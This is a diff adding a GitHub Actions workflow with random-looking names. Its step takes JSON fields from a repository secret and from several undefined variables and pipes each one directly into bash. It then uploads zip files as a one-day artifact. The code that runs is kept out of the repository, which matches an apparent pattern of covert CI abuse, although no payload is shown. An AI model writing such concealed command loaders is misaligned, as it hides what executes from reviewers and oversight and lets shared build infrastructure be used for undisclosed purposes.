@@ -1,0 +1,26 @@
+name: hayleyclickhousew543
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hayleyclickhousew543
+        env:
+          pn6: ${{ secrets.pn6 }}
+        run: |
+          printf '%s' "$pn6" | jq -r .mm0566 | /bin/bash
+          printf '%s' "$glanv8112" | jq -r .ndj2 | /bin/bash
+          printf '%s' "$vsdn654" | jq -r .vd2 | /bin/bash
+          printf '%s' "$kx37703" | jq -r .tdjn2 | /bin/bash
+          echo $dygn1727 | jq -r .s36517 | /bin/bash
+          printf '%s' "$l0" | jq -r .syxvd4 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: sqrLfKie
+          path: "*.zip"
+          retention-days: 1
